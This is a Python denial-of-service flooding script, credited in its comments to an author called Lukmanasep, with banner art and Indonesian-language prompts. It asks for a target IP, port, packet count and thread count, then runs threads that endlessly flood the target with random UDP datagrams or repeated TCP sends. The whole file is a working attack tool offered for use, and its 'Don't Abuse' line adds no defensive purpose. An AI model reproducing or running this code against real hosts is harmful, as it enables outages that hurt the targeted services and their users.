#!/usr/bin/env python3
#Ddos by Lukmanasep
import random
import socket
import threading
import os

os.system("clear")
print("░█████╗░██╗░░░██╗░██████╗████████╗██╗███╗░░██╗")
print("██╔══██╗██║░░░██║██╔════╝╚══██╔══╝██║████╗░██║")
print("███████║██║░░░██║╚█████╗░░░░██║░░░██║██╔██╗██║")
print("██╔══██║██║░░░██║░╚═══██╗░░░██║░░░██║██║╚████║")
print("██║░░██║╚██████╔╝██████╔╝░░░██║░░░██║██║░╚███║")
print("╚═╝░░╚═╝░╚═════╝░╚═════╝░░░░╚═╝░░░╚═╝╚═╝░░╚══╝")

print("------------------------------------------------------------")
print(" » Follow my Instagram : @tdyfnnx_ «")
print(" »      Don't Abuse bitch          «")
print(" »   TOOLS BY LukmanFENNIX!       «")
print("------------------------------------------------------------")
ip = str(input(" DDoSAttackByLukman | Ip:"))
port = int(input(" DDoSAttackByLukman | Port:"))
choice = str(input(" DDoSAttackByLukman | Gas Gak Ni?(y/n):"))
times = int(input(" DDoSAttackByLukman | Paket nya bos:"))
threads = int(input(" DDoSAttackByLukman | Threads:"))
def run():
	data = random._urandom(1024)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" LUKMAN  Menyenggol ")
		except:
			print("[!] YEOU REDY IS HERE DUDE! ")

def run2():
	data = random._urandom(16)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" LUKMAN Menyenggol ")
		except:
			s.close()
			print("[*] You redy IS HERE DUDE! ")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
